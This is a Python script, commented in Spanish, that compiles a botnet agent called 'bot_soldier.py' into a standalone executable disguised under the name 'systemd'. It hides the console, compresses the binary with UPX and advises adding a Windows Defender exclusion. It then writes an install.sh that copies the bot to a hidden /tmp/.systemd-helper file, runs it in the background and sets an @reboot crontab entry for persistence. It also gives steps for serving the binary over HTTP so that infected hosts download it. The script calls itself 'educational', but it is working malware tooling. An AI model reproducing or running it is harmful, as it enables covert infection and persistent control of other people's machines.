"""
Compila bot_soldier.py a ejecutable standalone usando PyInstaller.
El ejecutable NO requiere Python en la víctima.
"""
import subprocess
import sys
import os
import shutil
import time

def check_pyinstaller():
    """Verifica e instala PyInstaller."""
    try:
        import PyInstaller
        print("[+] PyInstaller ya está instalado")
        return True
    except ImportError:
        print("[*] PyInstaller no encontrado. Instalando...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
            print("[+] PyInstaller instalado correctamente")
            return True
        except:
            print("[!] Error instalando PyInstaller")
            return False

def create_spec_file():
    """Crea archivo .spec personalizado para mejor compilación."""
    spec_content = """# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['bot_soldier.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=['paramiko', 'netaddr', 'cryptography', '_cffi_backend'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=['tkinter', 'matplotlib', 'numpy', 'pandas'],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='systemd',
    debug=False,
    bootloader_ignore_signals=False,
    strip=True,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None
)
"""
    
    with open('bot_soldier.spec', 'w') as f:
        f.write(spec_content)
    
    print("[+] Archivo .spec creado")

def safe_remove(path, max_retries=3):
    """Elimina archivos/directorios de forma segura en Windows."""
    for attempt in range(max_retries):
        try:
            if os.path.isfile(path):
                # Quitar atributos de solo lectura
                os.chmod(path, 0o777)
                os.remove(path)
            elif os.path.isdir(path):
                # Quitar atributos de todos los archivos
                for root, dirs, files in os.walk(path):
                    for name in files:
                        filepath = os.path.join(root, name)
                        try:
                            os.chmod(filepath, 0o777)
                        except:
                            pass
                shutil.rmtree(path, ignore_errors=True)
            return True
        except PermissionError:
            if attempt < max_retries - 1:
                print(f"  [!] Archivo bloqueado, reintentando en 2 segundos... ({attempt+1}/{max_retries})")
                time.sleep(2)
            else:
                print(f"  [!] No se pudo eliminar {path} - puede estar en uso")
                print(f"  [*] Solución: Cierra todos los procesos de systemd.exe y Windows Defender")
                return False
        except Exception as e:
            print(f"  [!] Error: {e}")
            return False

def kill_process(name):
    """Mata procesos por nombre (Windows)."""
    if sys.platform == "win32":
        try:
            subprocess.run(['taskkill', '/F', '/IM', name], 
                         capture_output=True, timeout=5)
        except:
            pass

def compile_bot():
    """Compila el bot a ejecutable."""
    print("\n" + "="*70)
    print("       COMPILADOR DE BOT - LUCKY STAR")
    print("="*70 + "\n")
    
    # Verificar que bot_soldier.py existe
    if not os.path.exists('bot_soldier.py'):
        print("[!] Error: bot_soldier.py no encontrado")
        return False
    
    # Paso 1: Instalar PyInstaller
    print("[1/5] Verificando PyInstaller...")
    if not check_pyinstaller():
        return False
    
    # Paso 2: Limpiar builds anteriores
    print("\n[2/5] Limpiando builds anteriores...")
    
    # Matar procesos que puedan estar usando el ejecutable
    if sys.platform == "win32":
        print("  [*] Cerrando procesos previos...")
        kill_process('systemd.exe')
        kill_process('python.exe')
        time.sleep(1)
    
    # Eliminar directorios de build
    for dir in ['build', 'dist', '__pycache__']:
        if os.path.exists(dir):
            print(f"  [-] Eliminando {dir}/...")
            if not safe_remove(dir):
                response = input(f"\n  ¿Continuar sin eliminar {dir}/? (s/n): ").lower()
                if response != 's':
                    print("\n[!] Compilación cancelada")
                    print("[*] Cierra Windows Defender y procesos de systemd.exe")
                    print("[*] Luego vuelve a ejecutar este script")
                    return False
    
    # Paso 3: Crear archivo .spec personalizado
    print("\n[3/5] Creando archivo .spec optimizado...")
    create_spec_file()
    
    # Paso 4: Compilar
    print("\n[4/5] Compilando bot a ejecutable...")
    print("[*] Esto tomará 2-3 minutos. Por favor espera...\n")
    
    try:
        # Usar el archivo .spec para mejor control
        cmd = [
            sys.executable,
            "-m", "PyInstaller",
            "--clean",
            "--noconfirm",
            "bot_soldier.spec"
        ]
        
        # Ejecutar y mostrar output relevante
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
            encoding='utf-8',
            errors='replace'
        )
        
        for line in process.stdout:
            # Solo mostrar líneas importantes
            if any(word in line for word in ["ERROR", "Building", "completed", "Analyzing"]):
                print(line.strip())
        
        process.wait()
        
        if process.returncode == 0:
            print("\n[+] Compilación exitosa!")
        else:
            print("\n[!] Hubo errores en la compilación")
            return False
            
    except Exception as e:
        print(f"\n[!] Error durante compilación: {e}")
        return False
    
    # Paso 5: Verificar ejecutable
    print("\n[5/5] Verificando ejecutable...")
    
    exe_name = "systemd.exe" if sys.platform == "win32" else "systemd"
    exe_path = os.path.join("dist", exe_name)
    
    if os.path.exists(exe_path):
        size_mb = os.path.getsize(exe_path) / (1024 * 1024)
        print(f"\n[+] ¡Ejecutable creado exitosamente!")
        print(f"[+] Ubicación: {os.path.abspath(exe_path)}")
        print(f"[+] Tamaño: {size_mb:.2f} MB")
        print(f"\n[*] Características:")
        print(f"    ✓ NO requiere Python instalado")
        print(f"    ✓ Funciona standalone")
        print(f"    ✓ Incluye todas las dependencias")
        print(f"    ✓ Nombre discreto (systemd)")
        
        # Advertencia importante
        print(f"\n\033[93m⚠️  IMPORTANTE:\033[0m")
        print(f"    • Windows Defender puede detectar este archivo como malware")
        print(f"    • Es NORMAL - es un ejecutable de botnet educativo")
        print(f"    • Agrega exclusión en Windows Defender si es necesario")
        print(f"    • Ubicación: Settings > Update & Security > Windows Security")
        
        return True
    else:
        print("[!] No se encontró el ejecutable en dist/")
        return False

def create_deployment_package():
    """Crea paquete listo para deployment."""
    print("\n[*] Creando paquete de deployment...")
    
    deploy_dir = "deployment_package"
    if os.path.exists(deploy_dir):
        shutil.rmtree(deploy_dir)
    os.makedirs(deploy_dir)
    
    # Copiar ejecutable
    exe_name = "systemd.exe" if sys.platform == "win32" else "systemd"
    src = os.path.join("dist", exe_name)
    dst = os.path.join(deploy_dir, exe_name)
    
    if os.path.exists(src):
        shutil.copy2(src, dst)
        print(f"[+] Copiado: {exe_name}")
    
    # Crear script de instalación
    install_script = """#!/bin/bash
# Script de instalación del bot

echo "[*] Instalando bot..."

# Copiar ejecutable a ubicación discreta
cp systemd /tmp/.systemd-helper
chmod +x /tmp/.systemd-helper

# Ejecutar en background
nohup /tmp/.systemd-helper > /dev/null 2>&1 &

# Persistencia (opcional)
(crontab -l 2>/dev/null; echo "@reboot /tmp/.systemd-helper") | crontab -

echo "[+] Bot instalado y ejecutándose"
"""
    
    with open(os.path.join(deploy_dir, "install.sh"), 'w') as f:
        f.write(install_script)
    
    print(f"[+] Creado: install.sh")
    print(f"\n[+] Paquete completo en: {os.path.abspath(deploy_dir)}/")

def main():
    """Función principal."""
    if compile_bot():
        create_deployment_package()
        
        print("\n" + "="*70)
        print("       ✓ COMPILACIÓN COMPLETA")
        print("="*70)
        print("\nARCHIVOS GENERADOS:")
        print(f"  • dist/systemd.exe      - Ejecutable principal")
        print(f"  • deployment_package/   - Paquete listo para usar")
        print("\nPRÓXIMOS PASOS:")
        print("  1. Prueba local: dist\\systemd.exe")
        print("  2. Sube a servidor: python -m http.server 8000")
        print("  3. Modifica bot_soldier.py para descargar el binario")
        print("  4. URL: http://tu-ip:8000/systemd.exe")
        print("\nPARA LINUX:")
        print("  - Necesitas compilar en Linux para Linux")
        print("  - Ejecuta este script en una VM Ubuntu")
        print("  - O usa Docker para cross-compilation")
        print("="*70 + "\n")
        return True
    else:
        print("\n[!] Compilación fallida. Revisa los errores arriba.")
        return False

if __name__ == "__main__":
    try:
        success = main()
        input("\nPresiona Enter para continuar...")
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print("\n\n[!] Compilación cancelada por el usuario")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error inesperado: {e}")
        import traceback
        traceback.print_exc()
        input("\nPresiona Enter para continuar...")
        sys.exit(1)
